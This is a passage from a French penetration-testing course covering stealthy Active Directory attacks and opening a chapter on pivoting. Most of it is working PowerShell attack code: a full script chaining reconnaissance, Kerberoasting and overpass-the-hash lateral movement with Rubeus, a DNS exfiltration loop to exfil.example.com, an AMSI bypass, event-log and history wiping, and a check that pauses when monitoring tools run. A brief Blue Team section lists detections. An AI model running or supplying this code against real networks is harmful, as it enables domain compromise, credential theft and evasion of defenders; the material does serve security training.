1. **Verrouillage de comptes**
   - Tentatives excessives sur un même compte
   - Ignorer les politiques de verrouillage
   - Password spraying trop agressif
   
   **Solution :** Vérifier les politiques de verrouillage avant toute attaque, respecter les limites de tentatives, espacer les essais dans le temps.

2. **Utilisation d'identifiants compromis de manière évidente**
   - Connexions depuis des sources inhabituelles
   - Connexions à des heures anormales
   - Accès à des ressources non liées au rôle de l'utilisateur
   
   **Solution :** Comprendre le comportement normal de l'utilisateur compromis, limiter les actions aux comportements attendus, éviter les connexions à des heures inhabituelles.

3. **Mauvaise gestion des tickets Kerberos**
   - Extraction de tickets sans nettoyage
   - Utilisation de tickets expirés
   - Injection de tickets dans des sessions inappropriées
   
   **Solution :** Vérifier la validité des tickets avant utilisation, nettoyer les tickets après utilisation, injecter les tickets dans des sessions appropriées.

#### Erreurs de mouvement latéral

1. **Utilisation excessive de techniques bruyantes**
   - Création de multiples services
   - Exécution de commandes via WMI sans nécessité
   - Utilisation systématique de PowerShell Remoting
   
   **Solution :** Varier les techniques, privilégier les méthodes les moins bruyantes, limiter les actions au strict nécessaire.

2. **Négligence des artefacts laissés**
   - Fichiers temporaires non supprimés
   - Services créés non nettoyés
   - Processus suspicieux laissés en exécution
   
   **Solution :** Planifier le nettoyage avant l'action, supprimer systématiquement les artefacts, vérifier l'absence de traces après chaque action.

3. **Sous-estimation des solutions de détection**
   - Ignorer les EDR modernes
   - Négliger les capacités de corrélation des SIEM
   - Supposer que les techniques anciennes fonctionnent toujours
   
   **Solution :** Se tenir informé des capacités de détection modernes, adapter les techniques en conséquence, tester les méthodes dans un environnement contrôlé avant utilisation en production.

### OPSEC Tips : attaques AD discrètes

#### Techniques de base

1. **Limitation du bruit réseau**
   ```powershell
   # Utilisation de requêtes LDAP ciblées au lieu d'énumérations complètes
   Get-DomainUser -Identity username -Properties memberof,serviceprincipalname
   
   # Limitation des connexions SMB
   Get-DomainComputer -Properties dnshostname | Select-Object -First 5
   ```

2. **Espacement des actions dans le temps**
   ```python
   # Exemple de script Python avec délais aléatoires
   import time
   import random
   
   targets = ["user1", "user2", "user3", "user4", "user5"]
   
   for target in targets:
       # Action sur la cible
       print(f"Processing {target}")
       
       # Délai aléatoire entre 30 et 90 secondes
       delay = random.uniform(30, 90)
       print(f"Waiting {delay:.2f} seconds...")
       time.sleep(delay)
   ```

3. **Utilisation de comptes légitimes**
   ```powershell
   # Vérification des heures de connexion habituelles
   Get-DomainUser -Identity username -Properties logoncount,lastlogon,lastlogontimestamp
   
   # Limitation des actions aux heures de bureau normales
   $hour = (Get-Date).Hour
   if ($hour -ge 9 -and $hour -le 17) {
       # Exécuter les actions
   }
   ```

#### Techniques avancées

1. **Mimétisme de comportement légitime**
   ```powershell
   # Analyse du comportement normal avant action
   # Exemple : quels partages l'utilisateur accède-t-il habituellement ?
   Get-DomainUser -Identity username | Get-DomainUserEvent -EventType LoggedOn | Group-Object -Property TargetComputer
   
   # Limitation des actions aux cibles habituelles
   $usual_targets = @("server1", "server2", "server3")
   foreach ($target in $usual_targets) {
       # Action sur la cible
   }
   ```

2. **Utilisation de canaux de communication alternatifs**
   ```powershell
   # Utilisation de DNS pour l'exfiltration de données
   $data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("secret data"))
   $chunks = [System.Text.RegularExpressions.Regex]::Split($data, "(.{30})")
   foreach ($chunk in $chunks) {
       if ($chunk) {
           $domain = "$chunk.exfil.example.com"
           nslookup $domain
       }
   }
   ```

3. **Techniques anti-forensics**
   ```powershell
   # Nettoyage des logs PowerShell
   Clear-EventLog -LogName "Windows PowerShell"
   
   # Utilisation de PowerShell sans logging
   powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand base64_encoded_command
   
   # Utilisation de techniques AMSI bypass
   [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
   ```

#### Script d'attaque AD OPSEC

Voici un exemple de script pour réaliser une attaque AD discrète :

```powershell
# OPSEC-aware Active Directory Attack Script

# Configuration
$LogFile = "C:\Temp\opsec_log.txt"
$MinDelay = 30  # Secondes
$MaxDelay = 120 # Secondes
$WorkingHours = @(9..17)  # 9h à 17h
$MaxActionsPerDay = 10

# Fonction de logging discrète
function Write-OpsecLog {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Message,
        
        [Parameter(Mandatory=$false)]
        [string]$Level = "INFO"
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] [$Level] $Message"
    
    # Log en mémoire ou dans un fichier temporaire chiffré
    $logMessage | Out-File -Append -FilePath $LogFile
}

# Fonction pour vérifier si nous sommes dans les heures de travail
function Test-WorkingHours {
    $currentHour = (Get-Date).Hour
    return $WorkingHours -contains $currentHour
}

# Fonction pour introduire un délai aléatoire avec jitter
function Invoke-RandomDelay {
    param (
        [Parameter(Mandatory=$false)]
        [int]$MinSeconds = $MinDelay,
        
        [Parameter(Mandatory=$false)]
        [int]$MaxSeconds = $MaxDelay,
        
        [Parameter(Mandatory=$false)]
        [int]$JitterPercent = 20
    )
    
    $baseDelay = Get-Random -Minimum $MinSeconds -Maximum $MaxSeconds
    $jitterFactor = 1 + ((Get-Random -Minimum (-$JitterPercent) -Maximum $JitterPercent) / 100)
    $actualDelay = $baseDelay * $jitterFactor
    
    Write-OpsecLog "Waiting for $($actualDelay.ToString("0.00")) seconds..." -Level "DEBUG"
    Start-Sleep -Milliseconds ($actualDelay * 1000)
}

# Fonction pour vérifier si une action est sûre à exécuter
function Test-SafeToExecute {
    param (
        [Parameter(Mandatory=$true)]
        [string]$ActionType
    )
    
    # Vérifier si nous sommes dans les heures de travail
    if (-not (Test-WorkingHours)) {
        Write-OpsecLog "Action $ActionType not executed: outside working hours" -Level "WARNING"
        return $false
    }
    
    # Vérifier si nous n'avons pas dépassé le nombre maximum d'actions par jour
    $today = Get-Date -Format "yyyy-MM-dd"
    $todayActions = Select-String -Path $LogFile -Pattern "\[$today.*\] \[ACTION\]" | Measure-Object | Select-Object -ExpandProperty Count
    
    if ($todayActions -ge $MaxActionsPerDay) {
        Write-OpsecLog "Action $ActionType not executed: maximum daily actions reached ($todayActions/$MaxActionsPerDay)" -Level "WARNING"
        return $false
    }
    
    # Vérifier si des outils de détection sont actifs
    $suspiciousProcesses = @("wireshark", "procmon", "tcpdump", "sysmon")
    foreach ($process in $suspiciousProcesses) {
        if (Get-Process -Name $process -ErrorAction SilentlyContinue) {
            Write-OpsecLog "Action $ActionType not executed: detection tool $process running" -Level "WARNING"
            return $false
        }
    }
    
    return $true
}

# Fonction pour effectuer une reconnaissance discrète
function Invoke-DiscreteReconnaissance {
    param (
        [Parameter(Mandatory=$false)]
        [string]$Domain = $env:USERDNSDOMAIN
    )
    
    if (-not (Test-SafeToExecute -ActionType "Reconnaissance")) {
        return
    }
    
    Write-OpsecLog "Starting discrete reconnaissance on domain $Domain" -Level "ACTION"
    
    try {
        # Importer PowerView de manière discrète
        Write-OpsecLog "Loading PowerView..." -Level "DEBUG"
        $powerViewCode = Get-Content -Path "C:\Temp\PowerView.ps1" -Raw
        $powerViewCode = $powerViewCode -replace "Write-Verbose", "# Write-Verbose"  # Réduire la verbosité
        Invoke-Expression $powerViewCode
        
        # Obtenir des informations sur le domaine
        Write-OpsecLog "Getting domain information..." -Level "DEBUG"
        $domainInfo = Get-Domain -Domain $Domain
        Write-OpsecLog "Domain: $($domainInfo.Name), Forest: $($domainInfo.Forest)" -Level "INFO"
        
        Invoke-RandomDelay -MinSeconds 10 -MaxSeconds 30
        
        # Obtenir des informations sur les contrôleurs de domaine
        Write-OpsecLog "Getting domain controllers..." -Level "DEBUG"
        $dcs = Get-DomainController -Domain $Domain | Select-Object -First 2
        foreach ($dc in $dcs) {
            Write-OpsecLog "DC: $($dc.Name), OS: $($dc.OSVersion)" -Level "INFO"
            Invoke-RandomDelay -MinSeconds 5 -MaxSeconds 15
        }
        
        Invoke-RandomDelay
        
        # Obtenir des informations sur les utilisateurs privilégiés (limité à 3)
        Write-OpsecLog "Getting privileged users..." -Level "DEBUG"
        $admins = Get-DomainGroupMember -Identity "Domain Admins" -Domain $Domain | Select-Object -First 3
        foreach ($admin in $admins) {
            $user = Get-DomainUser -Identity $admin.MemberName -Domain $Domain -Properties samaccountname,description,lastlogon
            Write-OpsecLog "Admin: $($user.samaccountname), Last logon: $([datetime]::FromFileTime($user.lastlogon))" -Level "INFO"
            Invoke-RandomDelay -MinSeconds 5 -MaxSeconds 15
        }
        
        Invoke-RandomDelay
        
        # Obtenir des informations sur les comptes de service (limité à 3)
        Write-OpsecLog "Getting service accounts..." -Level "DEBUG"
        $serviceAccounts = Get-DomainUser -Domain $Domain -LDAPFilter "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" -Properties samaccountname,serviceprincipalname | Select-Object -First 3
        foreach ($svc in $serviceAccounts) {
            Write-OpsecLog "Service Account: $($svc.samaccountname), SPN: $($svc.serviceprincipalname -join ', ')" -Level "INFO"
            Invoke-RandomDelay -MinSeconds 5 -MaxSeconds 15
        }
        
        Write-OpsecLog "Reconnaissance completed successfully" -Level "SUCCESS"
    }
    catch {
        Write-OpsecLog "Error during reconnaissance: $_" -Level "ERROR"
    }
}

# Fonction pour effectuer un Kerberoasting discret
function Invoke-DiscreteKerberoasting {
    param (
        [Parameter(Mandatory=$false)]
        [string]$Domain = $env:USERDNSDOMAIN,
        
        [Parameter(Mandatory=$false)]
        [int]$MaxTargets = 2
    )
    
    if (-not (Test-SafeToExecute -ActionType "Kerberoasting")) {
        return
    }
    
    Write-OpsecLog "Starting discrete Kerberoasting on domain $Domain" -Level "ACTION"
    
    try {
        # Importer PowerView de manière discrète
        Write-OpsecLog "Loading PowerView..." -Level "DEBUG"
        $powerViewCode = Get-Content -Path "C:\Temp\PowerView.ps1" -Raw
        $powerViewCode = $powerViewCode -replace "Write-Verbose", "# Write-Verbose"  # Réduire la verbosité
        Invoke-Expression $powerViewCode
        
        # Obtenir des comptes de service (limité)
        Write-OpsecLog "Getting service accounts..." -Level "DEBUG"
        $serviceAccounts = Get-DomainUser -Domain $Domain -LDAPFilter "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" -Properties samaccountname,serviceprincipalname | Select-Object -First $MaxTargets
        
        $outputFile = "C:\Temp\kerberoast_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        
        foreach ($svc in $serviceAccounts) {
            Write-OpsecLog "Requesting TGS for $($svc.samaccountname)..." -Level "DEBUG"
            
            # Obtenir le ticket TGS
            $ticket = Get-DomainSPNTicket -SPN $svc.serviceprincipalname[0] -OutputFormat Hashcat
            
            # Sauvegarder le hash
            $ticket | Out-File -Append -FilePath $outputFile
            
            Write-OpsecLog "TGS requested for $($svc.samaccountname)" -Level "INFO"
            
            # Délai important entre les requêtes
            Invoke-RandomDelay -MinSeconds 60 -MaxSeconds 180
        }
        
        Write-OpsecLog "Kerberoasting completed successfully. Hashes saved to $outputFile" -Level "SUCCESS"
    }
    catch {
        Write-OpsecLog "Error during Kerberoasting: $_" -Level "ERROR"
    }
}

# Fonction pour effectuer un mouvement latéral discret
function Invoke-DiscreteMovement {
    param (
        [Parameter(Mandatory=$true)]
        [string]$TargetComputer,
        
        [Parameter(Mandatory=$true)]
        [string]$Username,
        
        [Parameter(Mandatory=$true)]
        [string]$NTHash
    )
    
    if (-not (Test-SafeToExecute -ActionType "LateralMovement")) {
        return
    }
    
    Write-OpsecLog "Starting discrete lateral movement to $TargetComputer" -Level "ACTION"
    
    try {
        # Vérifier si la cible est accessible
        Write-OpsecLog "Testing connectivity to $TargetComputer..." -Level "DEBUG"
        if (-not (Test-Connection -ComputerName $TargetComputer -Count 1 -Quiet)) {
            Write-OpsecLog "Target $TargetComputer is not reachable" -Level "ERROR"
            return
        }
        
        # Vérifier les connexions existantes pour éviter les duplications
        Write-OpsecLog "Checking existing connections..." -Level "DEBUG"
        $existingConnections = net use | Select-String $TargetComputer
        if ($existingConnections) {
            Write-OpsecLog "Connection to $TargetComputer already exists" -Level "WARNING"
            return
        }
        
        # Utiliser Rubeus pour Overpass-the-Hash (plus discret que Mimikatz)
        Write-OpsecLog "Performing Overpass-the-Hash..." -Level "DEBUG"
        $rubeusPath = "C:\Temp\Rubeus.exe"
        $rubeusOutput = & $rubeusPath asktgt /user:$Username /domain:$env:USERDNSDOMAIN /rc4:$NTHash /ptt
        
        # Vérifier si le ticket a été injecté avec succès
        if ($rubeusOutput -match "successfully imported") {
            Write-OpsecLog "Ticket successfully imported for $Username" -Level "INFO"
        }
        else {
            Write-OpsecLog "Failed to import ticket for $Username" -Level "ERROR"
            return
        }
        
        Invoke-RandomDelay
        
        # Tester l'accès avec une commande discrète
        Write-OpsecLog "Testing access to $TargetComputer..." -Level "DEBUG"
        $testCommand = "dir \\$TargetComputer\C$"
        $testResult = Invoke-Expression $testCommand
        
        if ($testResult) {
            Write-OpsecLog "Successfully accessed $TargetComputer" -Level "SUCCESS"
            
            # Exécuter une commande discrète via WMI
            Write-OpsecLog "Executing command via WMI..." -Level "DEBUG"
            $command = "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\""
            $wmiResult = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $command -ComputerName $TargetComputer
            
            if ($wmiResult.ReturnValue -eq 0) {
                Write-OpsecLog "Command executed successfully on $TargetComputer (PID: $($wmiResult.ProcessId))" -Level "SUCCESS"
            }
            else {
                Write-OpsecLog "Failed to execute command on $TargetComputer (Error: $($wmiResult.ReturnValue))" -Level "ERROR"
            }
        }
        else {
            Write-OpsecLog "Failed to access $TargetComputer" -Level "ERROR"
        }
    }
    catch {
        Write-OpsecLog "Error during lateral movement: $_" -Level "ERROR"
    }
}

# Fonction principale
function Start-OpsecADAttack {
    Write-OpsecLog "Starting OPSEC-aware Active Directory attack" -Level "INFO"
    
    # Vérifier l'environnement
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
    
    Write-OpsecLog "Current user: $currentUser, Admin: $isAdmin" -Level "INFO"
    Write-OpsecLog "Current domain: $env:USERDNSDOMAIN" -Level "INFO"
    
    # Phase 1: Reconnaissance discrète
    Invoke-DiscreteReconnaissance
    
    # Délai important entre les phases
    Invoke-RandomDelay -MinSeconds 300 -MaxSeconds 600
    
    # Phase 2: Kerberoasting discret
    Invoke-DiscreteKerberoasting -MaxTargets 2
    
    # Délai important entre les phases
    Invoke-RandomDelay -MinSeconds 300 -MaxSeconds 600
    
    # Phase 3: Mouvement latéral discret (exemple)
    $targetComputer = "server01.example.com"
    $username = "serviceaccount"
    $ntHash = "31d6cfe0d16ae931b73c59d7e0c089c0"  # Exemple de hash
    
    Invoke-DiscreteMovement -TargetComputer $targetComputer -Username $username -NTHash $ntHash
    
    Write-OpsecLog "OPSEC-aware Active Directory attack completed" -Level "INFO"
}

# Exécution du script principal
Start-OpsecADAttack
```

### Points clés

- La reconnaissance Active Directory doit être effectuée de manière méthodique et discrète, en privilégiant les requêtes ciblées plutôt que les énumérations massives.
- Les attaques d'authentification comme le password spraying et le Kerberoasting sont efficaces mais doivent être exécutées avec prudence pour éviter le verrouillage de comptes et la détection.
- Le mouvement latéral dans un domaine peut être réalisé via diverses techniques (Pass-the-Hash, WMI, PowerShell Remoting, DCOM), chacune avec ses avantages et inconvénients en termes de détectabilité.
- L'élévation de privilèges dans un domaine peut exploiter des configurations vulnérables comme les délégations, les ACL faibles, ou les services de certificats (ADCS).
- Les équipes défensives peuvent détecter ces attaques via l'analyse des logs d'authentification, des événements de sécurité, et des comportements anormaux.
- Des techniques OPSEC appropriées, comme l'espacement des actions dans le temps, la limitation du bruit réseau, et le nettoyage des traces, permettent de réduire significativement la détectabilité des opérations.

### Mini-quiz (3 QCM)

1. **Quelle technique permet d'obtenir des hachages Kerberos pour des comptes de service ?**
   - A) Pass-the-Hash
   - B) Kerberoasting
   - C) NTLM Relay
   - D) LDAP Injection

   *Réponse : B*

2. **Quelle vulnérabilité permet à un attaquant d'obtenir un certificat d'authentification pour n'importe quel utilisateur du domaine ?**
   - A) Délégation non contrainte
   - B) ACL vulnérable sur un groupe
   - C) ESC1 dans ADCS
   - D) AS-REP Roasting

   *Réponse : C*

3. **Quelle technique OPSEC est la plus efficace pour éviter la détection lors d'attaques Active Directory ?**
   - A) Utilisation exclusive d'outils PowerShell
   - B) Exécution de toutes les attaques depuis un contrôleur de domaine
   - C) Espacement des actions dans le temps avec des délais aléatoires
   - D) Désactivation des logs sur les systèmes cibles

   *Réponse : C*

### Lab/Exercice guidé : Reconnaissance et Kerberoasting discrets

#### Objectif
Effectuer une reconnaissance Active Directory suivie d'une attaque Kerberoasting de manière discrète, en minimisant les traces et en évitant la détection.

#### Prérequis
- Machine Windows jointe à un domaine Active Directory
- Compte utilisateur du domaine (privilèges standards)
- PowerShell et outils comme PowerView, Rubeus

#### Étapes

1. **Préparation de l'environnement**

```powershell
# Création du répertoire de travail
mkdir -Path C:\Temp\ADLab -ErrorAction SilentlyContinue

# Téléchargement des outils nécessaires
# Note: Dans un environnement réel, ces outils seraient déjà présents ou transférés de manière discrète
$powerViewUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"
$rubeusUrl = "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe"

# Téléchargement discret avec PowerShell
$webClient = New-Object System.Net.WebClient
$webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
$webClient.DownloadFile($powerViewUrl, "C:\Temp\ADLab\PowerView.ps1")
$webClient.DownloadFile($rubeusUrl, "C:\Temp\ADLab\Rubeus.exe")

# Vérification des fichiers téléchargés
if (Test-Path "C:\Temp\ADLab\PowerView.ps1" -and Test-Path "C:\Temp\ADLab\Rubeus.exe") {
    Write-Host "[+] Outils téléchargés avec succès" -ForegroundColor Green
} else {
    Write-Host "[-] Erreur lors du téléchargement des outils" -ForegroundColor Red
    exit
}

# Création d'un fichier de log
$logFile = "C:\Temp\ADLab\adlab_log.txt"
"[$(Get-Date)] Lab started" | Out-File -FilePath $logFile
```

2. **Reconnaissance discrète du domaine**

```powershell
# Fonction pour ajouter des entrées au log
function Write-Log {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Message,
        
        [Parameter(Mandatory=$false)]
        [string]$Level = "INFO"
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] [$Level] $Message"
    
    $logMessage | Out-File -Append -FilePath $logFile
    Write-Host $logMessage
}

# Fonction pour introduire un délai aléatoire
function Invoke-RandomDelay {
    param (
        [Parameter(Mandatory=$false)]
        [int]$MinSeconds = 5,
        
        [Parameter(Mandatory=$false)]
        [int]$MaxSeconds = 15
    )
    
    $delay = Get-Random -Minimum $MinSeconds -Maximum $MaxSeconds
    Write-Log "Waiting for $delay seconds..." -Level "DEBUG"
    Start-Sleep -Seconds $delay
}

# Chargement de PowerView de manière discrète
Write-Log "Loading PowerView..." -Level "ACTION"
. C:\Temp\ADLab\PowerView.ps1

# Obtention d'informations sur le domaine
Write-Log "Getting domain information..." -Level "ACTION"
$domainInfo = Get-Domain
Write-Log "Domain: $($domainInfo.Name), Forest: $($domainInfo.Forest)" -Level "INFO"

Invoke-RandomDelay

# Obtention d'informations sur les contrôleurs de domaine (limité à 2)
Write-Log "Getting domain controllers..." -Level "ACTION"
$dcs = Get-DomainController | Select-Object -First 2
foreach ($dc in $dcs) {
    Write-Log "DC: $($dc.Name), OS: $($dc.OSVersion)" -Level "INFO"
    Invoke-RandomDelay
}

Invoke-RandomDelay -MinSeconds 10 -MaxSeconds 30

# Obtention d'informations sur les utilisateurs privilégiés (limité à 3)
Write-Log "Getting privileged users..." -Level "ACTION"
$admins = Get-DomainGroupMember -Identity "Domain Admins" | Select-Object -First 3
foreach ($admin in $admins) {
    $user = Get-DomainUser -Identity $admin.MemberName -Properties samaccountname,description,lastlogon
    Write-Log "Admin: $($user.samaccountname), Last logon: $([datetime]::FromFileTime($user.lastlogon))" -Level "INFO"
    Invoke-RandomDelay
}

Invoke-RandomDelay -MinSeconds 10 -MaxSeconds 30

# Obtention d'informations sur les comptes de service (limité à 5)
Write-Log "Getting service accounts..." -Level "ACTION"
$serviceAccounts = Get-DomainUser -LDAPFilter "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" -Properties samaccountname,serviceprincipalname | Select-Object -First 5
foreach ($svc in $serviceAccounts) {
    Write-Log "Service Account: $($svc.samaccountname), SPN: $($svc.serviceprincipalname -join ', ')" -Level "INFO"
    Invoke-RandomDelay
}

# Sauvegarde des résultats de la reconnaissance
$reconFile = "C:\Temp\ADLab\recon_results.txt"
"Domain: $($domainInfo.Name)" | Out-File -FilePath $reconFile
"Forest: $($domainInfo.Forest)" | Out-File -FilePath $reconFile -Append
"" | Out-File -FilePath $reconFile -Append
"Domain Controllers:" | Out-File -FilePath $reconFile -Append
$dcs | Format-Table -Property Name, OSVersion | Out-String | Out-File -FilePath $reconFile -Append
"" | Out-File -FilePath $reconFile -Append
"Domain Admins:" | Out-File -FilePath $reconFile -Append
$admins | Format-Table -Property MemberName | Out-String | Out-File -FilePath $reconFile -Append
"" | Out-File -FilePath $reconFile -Append
"Service Accounts:" | Out-File -FilePath $reconFile -Append
$serviceAccounts | Format-Table -Property samaccountname, serviceprincipalname | Out-String | Out-File -FilePath $reconFile -Append

Write-Log "Reconnaissance completed. Results saved to $reconFile" -Level "SUCCESS"
```

3. **Kerberoasting discret**

```powershell
# Fonction pour effectuer un Kerberoasting discret
function Invoke-DiscreteKerberoasting {
    param (
        [Parameter(Mandatory=$false)]
        [int]$MaxTargets = 2
    )
    
    Write-Log "Starting discrete Kerberoasting" -Level "ACTION"
    
    # Sélection de cibles limitées pour le Kerberoasting
    $targets = $serviceAccounts | Select-Object -First $MaxTargets
    
    $outputFile = "C:\Temp\ADLab\kerberoast_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
    
    foreach ($target in $targets) {
        Write-Log "Requesting TGS for $($target.samaccountname)..." -Level "ACTION"
        
        # Méthode 1: Utilisation de PowerView (plus discrète)
        try {
            $ticket = Get-DomainSPNTicket -SPN $target.serviceprincipalname[0] -OutputFormat Hashcat
            $ticket | Out-File -Append -FilePath $outputFile
            Write-Log "TGS requested for $($target.samaccountname) using PowerView" -Level "SUCCESS"
        }
        catch {
            Write-Log "Error requesting TGS with PowerView: $_" -Level "ERROR"
            
            # Méthode 2: Utilisation de Rubeus (alternative)
            Write-Log "Trying with Rubeus..." -Level "ACTION"
            $rubeusOutput = & C:\Temp\ADLab\Rubeus.exe kerberoast /user:$($target.samaccountname) /nowrap
            
            if ($rubeusOutput -match "Hash.*:") {
                $hash = ($rubeusOutput | Select-String -Pattern "\$krb5tgs\$.*").Matches.Value
                $hash | Out-File -Append -FilePath $outputFile
                Write-Log "TGS requested for $($target.samaccountname) using Rubeus" -Level "SUCCESS"
            }
            else {
                Write-Log "Failed to request TGS for $($target.samaccountname)" -Level "ERROR"
            }
        }
        
        # Délai important entre les requêtes pour éviter la détection
        Invoke-RandomDelay -MinSeconds 30 -MaxSeconds 60
    }
    
    Write-Log "Kerberoasting completed. Hashes saved to $outputFile" -Level "SUCCESS"
    return $outputFile
}

# Exécution du Kerberoasting discret
$kerberoastFile = Invoke-DiscreteKerberoasting -MaxTargets 2

# Délai avant la prochaine action
Invoke-RandomDelay -MinSeconds 30 -MaxSeconds 60
```

4. **Analyse des hachages obtenus**

```powershell
# Fonction pour analyser les hachages Kerberos
function Analyze-KerberoastHashes {
    param (
        [Parameter(Mandatory=$true)]
        [string]$HashFile
    )
    
    Write-Log "Analyzing Kerberoast hashes from $HashFile" -Level "ACTION"
    
    if (-not (Test-Path $HashFile)) {
        Write-Log "Hash file not found: $HashFile" -Level "ERROR"
        return
    }
    
    $hashes = Get-Content $HashFile
    
    foreach ($hash in $hashes) {
        # Extraction du nom d'utilisateur du hash
        if ($hash -match '\$krb5tgs\$\d+\$\*([^*]+)\*\$') {
            $username = $matches[1]
            Write-Log "Hash found for user: $username" -Level "INFO"
            
            # Analyse du type de chiffrement
            if ($hash -match "23") {
                Write-Log "Encryption: RC4 (potentially weak)" -Level "INFO"
            }
            elseif ($hash -match "17") {
                Write-Log "Encryption: AES128 (stronger)" -Level "INFO"
            }
            elseif ($hash -match "18") {
                Write-Log "Encryption: AES256 (strongest)" -Level "INFO"
            }
        }
    }
    
    Write-Log "Hash analysis completed" -Level "SUCCESS"
}

# Analyse des hachages obtenus
Analyze-KerberoastHashes -HashFile $kerberoastFile
```

5. **Nettoyage des traces**

```powershell
# Fonction pour nettoyer les traces
function Invoke-TraceCleanup {
    Write-Log "Starting trace cleanup..." -Level "ACTION"
    
    # Nettoyage des logs PowerShell (dans un environnement réel, ceci pourrait être détecté)
    # Note: Cette partie est commentée car elle pourrait être détectée dans un environnement réel
    # Write-Log "Clearing PowerShell logs..." -Level "ACTION"
    # wevtutil cl "Windows PowerShell"
    # wevtutil cl "Microsoft-Windows-PowerShell/Operational"
    
    # Alternative plus discrète: Nettoyage de l'historique PowerShell
    Write-Log "Clearing PowerShell history..." -Level "ACTION"
    Clear-History
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
    
    # Nettoyage des fichiers temporaires (optionnel, selon le contexte)
    # Write-Log "Cleaning temporary files..." -Level "ACTION"
    # Remove-Item C:\Temp\ADLab\PowerView.ps1 -ErrorAction SilentlyContinue
    # Remove-Item C:\Temp\ADLab\Rubeus.exe -ErrorAction SilentlyContinue
    
    Write-Log "Trace cleanup completed" -Level "SUCCESS"
}

# Exécution du nettoyage des traces
Invoke-TraceCleanup

# Finalisation du lab
Write-Log "Lab completed successfully" -Level "SUCCESS"
Write-Host "Lab completed. Results are available in C:\Temp\ADLab\" -ForegroundColor Green
```

6. **Analyse des résultats**

```powershell
# Affichage des résultats
Write-Host "`nLab Results Summary:" -ForegroundColor Cyan
Write-Host "=====================" -ForegroundColor Cyan
Write-Host "Reconnaissance results: $reconFile" -ForegroundColor Yellow
Write-Host "Kerberoast hashes: $kerberoastFile" -ForegroundColor Yellow
Write-Host "Log file: $logFile" -ForegroundColor Yellow
Write-Host "`nImportant findings:" -ForegroundColor Cyan
Write-Host "- Domain: $($domainInfo.Name)" -ForegroundColor White
Write-Host "- Domain Controllers: $($dcs.Count) identified" -ForegroundColor White
Write-Host "- Domain Admins: $($admins.Count) identified" -ForegroundColor White
Write-Host "- Service Accounts: $($serviceAccounts.Count) identified" -ForegroundColor White
Write-Host "- Kerberoast hashes: $(if (Test-Path $kerberoastFile) { (Get-Content $kerberoastFile).Count } else { 0 }) obtained" -ForegroundColor White
```

#### Vue Blue Team

Dans un environnement réel, cette approche discrète générerait tout de même des traces détectables :

1. **Logs générés**
   - Événements d'authentification Kerberos (4768, 4769)
   - Requêtes LDAP pour l'énumération d'objets
   - Connexions PowerShell et exécution de scripts

2. **Alertes potentielles**
   - Détection de requêtes TGS pour des comptes de service (Kerberoasting)
   - Énumération d'objets sensibles (Domain Admins, contrôleurs de domaine)
   - Comportement anormal pour l'utilisateur (requêtes inhabituelles)

3. **Contre-mesures possibles**
   - Surveillance des événements Kerberos pour détecter le Kerberoasting
   - Détection des requêtes LDAP massives ou suspectes
   - Surveillance des connexions PowerShell et de l'exécution de scripts

#### Résultat attendu

À la fin de cet exercice, vous devriez :
- Avoir effectué une reconnaissance discrète du domaine Active Directory
- Avoir identifié des comptes de service vulnérables au Kerberoasting
- Avoir obtenu des hachages Kerberos pour ces comptes
- Comprendre les traces générées par ces activités et comment les minimiser
- Apprécier l'importance des techniques OPSEC dans les attaques Active Directory
# PARTIE II : PASSERELLE INTERMÉDIAIRE (+ OPSEC NIVEAU 2)

## Chapitre 13 : Pivoting avancé & Tunneling

### Introduction : Pourquoi ce thème est important

Le pivoting et le tunneling sont des compétences essentielles pour tout pentester avancé, permettant de naviguer à travers des réseaux segmentés et d'accéder à des systèmes qui ne sont pas directement accessibles depuis le point d'entrée initial. Ces techniques sont cruciales pour les tests d'intrusion réalistes où les réseaux sont correctement segmentés, ainsi que pour les évaluations de sécurité en profondeur. En intégrant les principes d'OPSEC de niveau 2, nous verrons comment réaliser ces opérations de manière discrète pour éviter la détection par les équipes de sécurité. Ce chapitre couvre les techniques avancées de pivoting et de tunneling, depuis la création de tunnels simples jusqu'à l'établissement de chaînes de pivots complexes à travers plusieurs segments de réseau.

### Principes fondamentaux du pivoting

#### Concepts clés

1. **Définition du pivoting**
   - Utilisation d'un système compromis comme point de rebond pour accéder à d'autres systèmes
   - Contournement des restrictions de routage et de pare-feu
   - Extension de la portée d'une attaque à des réseaux non directement accessibles

2. **Types de pivoting**
   - Pivoting de niveau réseau (couche 3) : routage du trafic IP
   - Pivoting de niveau transport (couche 4) : redirection de ports TCP/UDP
   - Pivoting de niveau application (couche 7) : proxying de protocoles spécifiques

3. **Scénarios courants nécessitant du pivoting**
   - Réseaux d'entreprise segmentés (DMZ, réseau interne, etc.)
   - Environnements cloud avec des VPC isolés
   - Systèmes industriels (ICS/SCADA) avec isolation réseau
   - Réseaux IoT segmentés

4. **Prérequis pour le pivoting**
   - Accès à un système pivot (shell, RCE, etc.)
   - Privilèges suffisants sur le système pivot
   - Connectivité du système pivot vers les cibles
   - Capacité à exécuter des outils ou à établir des connexions sortantes

